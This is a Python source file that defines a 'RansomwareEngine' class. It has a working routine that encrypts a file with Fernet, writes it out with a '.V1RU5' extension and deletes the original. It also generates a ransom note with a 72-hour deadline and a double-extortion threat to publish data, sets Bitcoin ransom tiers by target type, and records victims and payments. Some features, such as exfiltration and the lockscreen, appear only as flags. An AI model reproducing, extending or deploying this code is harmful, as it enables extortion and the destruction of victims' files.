"""
Ransomware Engine — file encryption, ransom note generation, deployment tracking.
"""
import json
import time
import base64
import hashlib
from cryptography.fernet import Fernet


class RansomwareEngine:
    def __init__(self):
        self.active = False
        self.key = None
        self.stats = {
            "files_encrypted": 0,
            "bytes_locked": 0,
            "ransom_paid": 0,
            "nodes_deployed": 0,
            "target_extensions": [],
            "last_deployment": None,
        }
        self.victims = []  # list of {node_id, files, bytes, timestamp, status}
        self.ransom_amounts = {
            "individual": 0.05,   # BTC
            "corporate": 1.5,
            "enterprise": 5.0,
        }
        self.double_extortion = True
        self.lockscreen = True
        self.crypto_algo = "AES-256"
        self.note_template = None

    def generate_key(self) -> bytes:
        self.key = Fernet.generate_key()
        return self.key

    def encrypt_file(self, filepath: str, fernet: Fernet) -> int:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        outpath = filepath + '.V1RU5'
        with open(outpath, 'wb') as f:
            f.write(encrypted)
        import os
        os.remove(filepath)
        return len(data)

    def generate_note(self, key_hex: str, amount: float, wallet: str, target_type: str = "individual") -> str:
        return (
            "========================================\n"
            "       YOUR FILES ARE ENCRYPTED\n"
            "========================================\n\n"
            f"All documents, databases, and backups\n"
            f"have been encrypted with {self.crypto_algo}.\n\n"
            f"KEY ID: {key_hex[:16]}...\n"
            f"PAYMENT: {amount} BTC\n"
            f"WALLET: {wallet}\n"
            f"DEADLINE: 72 hours from {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())}\n\n"
            f"After payment, decryption key will\n"
            f"be delivered automatically.\n\n"
            + ("WARNING: Refusal to pay will result\n"
               "in publication of exfiltrated data.\n\n" if self.double_extortion else "") +
            "Contact: darknet chat portal\n"
            "========================================\n"
        )

    def get_status(self) -> dict:
        return {
            "active": self.active,
            "key_generated": self.key is not None,
            "crypto": self.crypto_algo,
            "double_extortion": self.double_extortion,
            "lockscreen": self.lockscreen,
            "stats": self.stats,
            "victims": self.victims[-20:],
            "ransom_amounts": self.ransom_amounts,
        }

    def record_deployment(self, node_id: str, files: int, bytes_encrypted: int):
        self.stats["files_encrypted"] += files
        self.stats["bytes_locked"] += bytes_encrypted
        self.stats["nodes_deployed"] += 1
        self.victims.append({
            "node_id": node_id,
            "files": files,
            "bytes": bytes_encrypted,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "paid": False,
        })
        self.active = True

    def record_payment(self, node_id: str, amount: float):
        self.stats["ransom_paid"] += amount
        for v in self.victims:
            if v["node_id"] == node_id:
                v["paid"] = True
                break

    def stop(self):
        self.active = False
        self.key = None


ransomware_engine = RansomwareEngine()
